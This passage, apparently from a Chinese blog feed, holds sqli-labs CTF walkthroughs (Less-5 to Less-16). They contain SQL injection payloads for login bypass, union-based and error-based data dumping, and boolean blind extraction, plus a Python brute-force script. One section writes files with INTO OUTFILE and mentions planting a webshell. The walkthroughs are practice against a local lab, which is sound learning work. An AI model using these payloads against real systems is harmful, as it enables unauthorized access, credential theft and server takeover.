    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前面的关卡都是基于get请求的，从这个关卡起，我们就要走进post注入的世界了，什么是post呢？就是数据从客户端提交到服务器端，例如在登录过程中输入的用户名和密码，这些数据以表单的形式提交到服务器端，然后在服务器端进行验证（一堆废话23333</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>让我们来熟悉一下一次POST请求和数据库交互的过程吧。</p><ol><li><p>提交正常的username和password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=ju5tw4nty0u&amp;password=12345</span><br></pre></td></tr></table></figure></li><li><p>假设后台的sql查询语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;select username,password from users where username=&apos;$username&apos; and password=&apos;$password&apos; limit 0,1&quot;;</span><br></pre></td></tr></table></figure></li><li><p>这是我们构造的语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;select username,password from users where username=&apos;ju5tw4nty0u&apos; and password=&apos;12345&apos; limit 0,1&quot;;</span><br></pre></td></tr></table></figure></li><li><p>当我们提交的username和password为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=ju5tw4nty0u&apos;#&amp;password=12345</span><br></pre></td></tr></table></figure></li><li><p>这时查询语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;select username,password from users where username=&apos;ju5tw4nty0u&apos;# &apos;and password=&apos;12345&apos; limit 0,1&quot;;</span><br></pre></td></tr></table></figure></li><li><p>可以看到<code>#</code>将后面的语句注释掉了，所以只要我们输入的用户名为<code>ju5tw4nty0u</code>时，就能够成功登陆；</p></li><li>当我们用户名也不知道的时候，可以构造<code>ju5tw4nty0u&#39; or 1=1#</code>来实现登录；</li></ol><p>这就是POST注入的基本原理了，让我们走进关卡，感受一下万能密码的妙用吧。</p><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><ol><li>当我们输入uname=ju5tw4nty0u’&amp;passwd=123&amp;submit=Submit时发现报错<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your MySQL server version for the right syntax to use near &apos;123&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure></li></ol><p>可知这里对参数做了单引号的处理</p><ol><li><p>我们可以构造<code>username=ju5tw4nty0u&#39;#&amp;password=123</code>来提交，发现成功登陆；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ju5tw4nty0u&apos; or 1=1#&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>判断字段数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; order by 3#&amp;passwd=123&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">Unknown column &apos;3&apos; in &apos;order clause&apos;</span><br></pre></td></tr></table></figure></li><li><p>查当前数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ju5tw4nty0u&apos; union select 1,database()#&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>查所有表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ju5tw4nty0u&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>查字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ju5tw4nty0u&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;#&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>字段值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ju5tw4nty0u&apos; union select 1,group_concat(username) from users#&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure></li></ol><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><ol><li><p>尝试输入<code>uname=ju5tw4nty0u&quot;</code>发现报错，可知对ID参数做了双引号和括号的处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;123&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure></li><li><p>可以构造<code>uname=ju5tw4nty0u&quot;) or 1=1#&amp;passwd=123&amp;submit=Submit</code>来绕过</p></li><li><p>查询数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ju5tw4nty0u&quot;) union select 1,database()#&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>以此类推，和less-11类似……</p></li></ol><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><ol><li><p>尝试输入<code>uname=ju5tw4nty0u&#39;</code>发现报错，可知对ID参数做了单引号和括号的处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;123&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure></li><li><p>构造<code>uname=ju5tw4nty0u&#39;) or 1=1#&amp;passwd=123&amp;submit=Submit</code>发现登陆成功，不过没有回显具体内容，所以可以考虑使用盲注和报错注入；</p></li><li><p>使用报错注入查看当前users表的第三个字段（其余的参考less-5）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ju5tw4nty0u&apos;) and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e))#&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>使用盲注的方法参考less-5，这里就不多赘述了；</p></li></ol><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><ol><li><p>尝试输入<code>uname=ju5tw4nty0u&quot;</code>发现报错，可知对ID参数做了双引号的处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;123&quot; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure></li><li><p>构造<code>uname=ju5tw4nty0u&quot; or 1=1#&amp;passwd=123&amp;submit=Submit</code></p></li><li>因为登陆成功后没有回显具体内容，所以还是使用盲注或者报错注入，参考less-5；</li></ol><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><ol><li><p>随便输入判断，发现都没有报错，这里应该是限制了报错注入，当我们使用<code>uname=admin&#39;#&amp;passwd=123&amp;submit=Submit</code>时，显示登陆成功，sql语句对id的处理是单引号；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ju5tw4nty0u&apos; or 1=1#&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>页面没有回显具体内容，所以只能使用盲注来进行注入了，这里参考Less-5；</p></li></ol><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><ol><li><p>随便输入判断，发现都没有报错，这里应该是限制了报错注入，当我们使用<code>uname=admin&quot;)#&amp;passwd=123&amp;submit=Submit</code>时，显示登陆成功，sql语句对id的处理是双引号和括号；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ju5tw4nty0u&quot;) or 1=1#&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>页面没有回显具体内容，所以只能使用盲注来进行注入了，这里参考Less-5；</p></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>至此POST注入也就告一段落了，总的来说和GET注入是非常类似的，方法也是通用的，由于没有做什么过滤，所以几题做下来还是很轻松的，下一节我们就要讲讲数据库的增删改查了（233333</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前面的关卡都是基于get请求的，从这个关卡起，我们就要走进post注入的世界了，什么是post呢？就是数据从客户端提交到服务器端，例如在登录
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
    
      <category term="SQL" scheme="http://ju5tw4nty0u.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>SQL-LABS入门到放弃4（part1）</title>
    <link href="http://ju5tw4nty0u.top/2018/03/23/SQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%834%EF%BC%88part1%EF%BC%89/"/>
    <id>http://ju5tw4nty0u.top/2018/03/23/SQL-LABS入门到放弃4（part1）/</id>
    <published>2018-03-23T09:34:41.000Z</published>
    <updated>2018-03-23T10:18:29.488Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><ol><li><p>题目提示<code>Less-8 Blind- Boolian- Single Quotes- String</code>，所以可以知道对id的处理方式为<code>&#39;id&#39;</code>，页面没有返回具体内容，所以可以用bool型盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1&apos; or 1=1--+</span><br></pre></td></tr></table></figure></li><li><p>具体参考less-5的ASCII、SUBSTR等函数的结合使用，也可以使用时间盲注。<br><a href="http://ju5tw4nty0u.top/2018/03/17/SQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%832%EF%BC%88part1%EF%BC%89/">Less-5传送门 To Less-8</a></p></li><li>从源代码中我们可以看到mysql_error（）被注释了，所以没有办法使用报错注入。</li></ol><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><ol><li>题目提示<code>Less-9 Blind- Time based- Single Quotes- String</code>,所以可以知道对id的处理方式为<code>&#39;id&#39;</code>，这里可以使用时间盲注。</li><li>具体参考Less-5的做法，这里就不多说了。<br><a href="http://ju5tw4nty0u.top/2018/03/17/SQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%832%EF%BC%88part1%EF%BC%89/">Less-5传送门 To Less-9</a></li></ol><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><ol><li>题目提示<code>Less-10 Blind- Time based- Double Quotes- String</code>,所以可以知道对id的处理方式为<code>&quot;id&quot;</code>,这里可以使用时间盲注。</li><li>具体参考Less-5的做法，这里就不多说了。<br><a href="http://ju5tw4nty0u.top/2018/03/17/SQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%832%EF%BC%88part1%EF%BC%89/">Less-5传送门 To Less-10</a></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>因为这几关都是和Less-5类似的，只是对ID的处理有所不同，以及注入方法的不同，这里就偷个懒QAQ。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Less-8&quot;&gt;&lt;a href=&quot;#Less-8&quot; class=&quot;headerlink&quot; title=&quot;Less-8&quot;&gt;&lt;/a&gt;Less-8&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;题目提示&lt;code&gt;Less-8 Blind- Boolian- Single Quote
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
    
      <category term="SQL" scheme="http://ju5tw4nty0u.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>SQL-LABS入门到放弃3（part1）</title>
    <link href="http://ju5tw4nty0u.top/2018/03/23/SQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%833%EF%BC%88part1%EF%BC%89/"/>
    <id>http://ju5tw4nty0u.top/2018/03/23/SQL-LABS入门到放弃3（part1）/</id>
    <published>2018-03-23T05:58:20.000Z</published>
    <updated>2018-03-23T07:11:51.094Z</updated>
    
    <content type="html"><![CDATA[<p>前面我们已经讲了常见的注入方式了，这次我们来讲讲SQL的文件操作</p><h1 id="数据库文件的基本操作"><a href="#数据库文件的基本操作" class="headerlink" title="数据库文件的基本操作"></a>数据库文件的基本操作</h1><h2 id="Load-file-导出文件"><a href="#Load-file-导出文件" class="headerlink" title="Load_file()导出文件"></a>Load_file()导出文件</h2><p>load_file(file_name):读取文件并返回该文件的内容作为一个字符串<br>使用条件：</p><ul><li><p>必须有权限读取并且文件必须完全可读</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0  </span><br><span class="line">/*如果结果返回正常，说明具有读写权限</span><br><span class="line">/*返回错误，应该还是管理员给数据库账号降权</span><br></pre></td></tr></table></figure></li><li><p>欲读取的文件必须在服务器上</p></li><li>必须指定文件的完整路径</li><li>欲读取的文件必须小于max_allowed_packet</li></ul><p>难点：</p><ul><li>绝对路径不好获取</li><li>构造有效的语句（报错出绝对路径）<br>当提交一个错误的query，如果display_error=on，程序会暴露web目录的绝对路径。</li></ul><h2 id="文件导入到数据库"><a href="#文件导入到数据库" class="headerlink" title="文件导入到数据库"></a>文件导入到数据库</h2><p>laod data infile语句用于高速地从一个文本文件中读取行，并装入一个表中，文件名称必须为一个文字字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load data infile &apos;/tmp/t0.txt&apos; ignore into table t0 character set gbk fields terminated by &apos;\t&apos; lines terminated by &apos;\n&apos;</span><br><span class="line">/*将/tmp/t0.txt导入到t0表中，字符集设置为gbk，每一项数据的分隔符为&apos;\t&apos;,每一行的分隔符为&apos;\n&apos;</span><br></pre></td></tr></table></figure></p><h2 id="导入结果到文件中"><a href="#导入结果到文件中" class="headerlink" title="导入结果到文件中"></a>导入结果到文件中</h2><p>select ….into outfile ‘file_name’<br>把查询的结果写到一个<code>文件名不重复</code>的文件，创建在服务器主机上，有足够的权限就可以读取结果。</p><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>标题提示<code>dump into outfile</code>，所以我们可以试着用文件导入来注入。<br>这里对id的处理为<code>((&#39;id&#39;))</code>，所以我们可以构造<code>1&#39;))or 1=1--+</code>进行注入</p><p>使用less5的方法既可以注入成功（盲注）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7/index.php?id=1&apos;))or 1=1--+</span><br></pre></td></tr></table></figure></p><p>使用文件导入的方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) union select 1,2,(select group_concat(username) from users) into outfile &quot;E:......\\sqli-labs-master\\Less-7\\u6u.txt&quot;--+</span><br></pre></td></tr></table></figure></p><p>u6u.txt的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1DumbDumb</span><br><span class="line">12Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br></pre></td></tr></table></figure></p><p>这里可以写入一句话木马然后用菜刀等工具来连接。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>通过文件的操作来进行注入要求的条件比较苛刻，在现实条件下不容易实现，但是我们还是需要了解一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前面我们已经讲了常见的注入方式了，这次我们来讲讲SQL的文件操作&lt;/p&gt;
&lt;h1 id=&quot;数据库文件的基本操作&quot;&gt;&lt;a href=&quot;#数据库文件的基本操作&quot; class=&quot;headerlink&quot; title=&quot;数据库文件的基本操作&quot;&gt;&lt;/a&gt;数据库文件的基本操作&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
    
      <category term="SQL" scheme="http://ju5tw4nty0u.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>SQL-LABS入门到放弃2（part1）</title>
    <link href="http://ju5tw4nty0u.top/2018/03/17/SQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%832%EF%BC%88part1%EF%BC%89/"/>
    <id>http://ju5tw4nty0u.top/2018/03/17/SQL-LABS入门到放弃2（part1）/</id>
    <published>2018-03-17T11:51:21.000Z</published>
    <updated>2018-03-23T06:00:36.301Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上一次我们讲了最基础的联合查询，眼看就来到了Less-5了，这里我接触了更加摸不着头脑的盲注，不过这也让小萌新的我好奇心倍增，那么就让我们一起走进盲注的世界吧，感受一下一脸懵逼的感觉。</p><h1 id="盲注及其分类"><a href="#盲注及其分类" class="headerlink" title="盲注及其分类"></a>盲注及其分类</h1><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>什么是盲注呢？盲注就是在SQL注入过程中，当执行完SQL语句是，我们所查询的数据没办法回显到我们的前端页面，这是我们就只能构造一些逻辑判断来猜解，这个过程就是盲注啦哈哈哈哈（废话一堆）。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li><p>基于布尔的盲注（构造逻辑判断）</p><ul><li>利用left()函数</li><li>利用substr（）、ascii（）函数</li><li>利用regexp</li><li>利用ord（）、mid（）函数</li></ul></li><li><p>基于时间的盲注（延时注入）</p><ul><li>sleep（）函数</li><li>benchmark()函数</li></ul></li><li><p>基于报错的盲注（构造payload让信息通过错误提示回显）</p><ul><li>concat()、floor（）、rand（）、group by</li><li>exp()</li><li>bigint</li><li>extractvalue()</li><li>updatexml()</li><li>重复特性<br>光看这些就有点懵了，还是通过关卡实践吧，慢慢理解…</li></ul></li></ul><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="ascii函数"><a href="#ascii函数" class="headerlink" title="ascii函数"></a>ascii函数</h3><p>返回字符的ASCII值</p><h3 id="substr函数"><a href="#substr函数" class="headerlink" title="substr函数"></a>substr函数</h3><p>同mid函数，参数有3个</p><pre><code>* 提取的字段* 开始位置* 返回的字符数</code></pre><h3 id="left函数"><a href="#left函数" class="headerlink" title="left函数"></a>left函数</h3><p>得到字符串的左部指定个数的字符，有2个参数：</p><pre><code>* 要截取的字符串* 长度</code></pre><h3 id="mid函数"><a href="#mid函数" class="headerlink" title="mid函数"></a>mid函数</h3><p>截取字符串，参数有3个：</p><pre><code>* 提取的字段* 开始位置* 返回的字符数</code></pre><h3 id="ord函数"><a href="#ord函数" class="headerlink" title="ord函数"></a>ord函数</h3><p>同ascii函数，返回字符的ASCII值</p><h3 id="sleep函数"><a href="#sleep函数" class="headerlink" title="sleep函数"></a>sleep函数</h3><p>表示延时。</p><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><h2 id="基于布尔"><a href="#基于布尔" class="headerlink" title="基于布尔"></a>基于布尔</h2><h3 id="ascii-substr-mid-ord"><a href="#ascii-substr-mid-ord" class="headerlink" title="ascii substr mid ord"></a>ascii substr mid ord</h3><ol><li>输入<code>id=1&#39;</code>报错<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure></li></ol><p>说明sql语句中对id的处理为<code>id=&#39;1&#39;</code></p><ol><li>找到了注入点，我们可以使用ASCII和SUBSTR函数进行盲注，构造逻辑条件，根据是否回显<code>You are in...........</code>来确认所要查询的字符</li><li><p>查询数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))&lt;111)--+</span><br></pre></td></tr></table></figure></li><li><p>查询表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),1,1))&gt;111)--+</span><br></pre></td></tr></table></figure></li><li><p>查询字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),1,1))&lt;111)--+</span><br></pre></td></tr></table></figure></li><li><p>查询字段值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(ascii(substr((select group_concat(username) from users),1,1))&lt;111)--+</span><br></pre></td></tr></table></figure></li><li><p>这里将ascii换成ord函数，讲substr换成mid函数效果是一样的</p></li><li>附上自己写的脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import re</span><br><span class="line">import urllib</span><br><span class="line">import urllib2</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,50):</span><br><span class="line">for j in range(33,127):</span><br><span class="line">#url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1%27and%20ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;--+&quot;</span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1%27and%20ascii(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;--+&quot;</span><br><span class="line">#url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1%27and%20ascii(substr((select%20group_concat(username)%20from%20users),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;--+&quot;</span><br><span class="line">#url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1%27and%20ascii(substr((select%20group_concat(password)%20from%20users),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;--+&quot;</span><br><span class="line">req = urllib2.Request(url)</span><br><span class="line">res_data = urllib2.urlopen(req)</span><br><span class="line">res = res_data.read()</span><br><span class="line">s = &apos;You are in...........&apos;</span><br><span class="line">print res</span><br><span class="line">if s in res:</span><br><span class="line">flag +=chr(j)</span><br><span class="line">print flag</span><br><span class="line">break</span><br><span class="line"></span><br><span class="line">print &apos;over！！！&apos;</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></li></ol><h3 id="left-length"><a href="#left-length" class="headerlink" title="left length"></a>left length</h3><ol><li><p>判断数据库长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(length(database())&lt;10)--+</span><br></pre></td></tr></table></figure></li><li><p>查数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(left(database(),1)=&apos;u&apos;)--+</span><br></pre></td></tr></table></figure></li><li><p>查表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(left((select group_concat(table_name) from information_schema.tables where table_schema=database()),1)=&apos;e&apos;)--+</span><br></pre></td></tr></table></figure></li><li><p>查列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(left((select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),2)=&apos;id&apos;)--+</span><br></pre></td></tr></table></figure></li><li><p>查字段值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(left((select group_concat(username) from users),2)=&apos;du&apos;)--+</span><br></pre></td></tr></table></figure></li><li><p>在写脚本的时候发现left匹配的时候大小写不区分，所以这里爆破出来的都是大写的字符，需要结合其他函数做一个ascii值的转换，这样才能准确判断出来。</p></li></ol><h3 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h3><p>此方法暂时没完全理解，等啥时候懂了再总结。QAQ太菜了自己感觉！！</p><h2 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h2><h3 id="count、-floor、-rand、-group-by"><a href="#count、-floor、-rand、-group-by" class="headerlink" title="count、 floor、 rand、 group by"></a>count、 floor、 rand、 group by</h3><ol><li>函数简介</li></ol><ul><li><code>rand()</code>：用于产生一个0-1的随机数</li><li><code>floor（）</code>：向下取整</li><li><code>floor(rand(0)*2)</code>：将rand函数随机生成的数向下取整，因为<code>*2</code>，所以结果为0或者1</li><li><code>concat()</code>：将符合条件的同一列的不同行进行拼接，加入0x3a是为了方便观察</li><li><code>group by</code>：根据规则分组</li><li><code>count()</code>：统计元组个数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(0x3a,0x3a,user(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br></pre></td></tr></table></figure><ol><li><p>当前用户、版本、数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li><li><p>所有数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li><li><p>所有表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li><li><p>字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li><li><p>字段值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li></ol><p>这里参考了<br><a href="http://blog.51cto.com/wt7315/1891458" target="_blank" rel="noopener">http://blog.51cto.com/wt7315/1891458</a><br><a href="https://www.cnblogs.com/xishaonian/p/6227405.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6227405.html</a></p><h3 id="double数字类型超出范围报错"><a href="#double数字类型超出范围报错" class="headerlink" 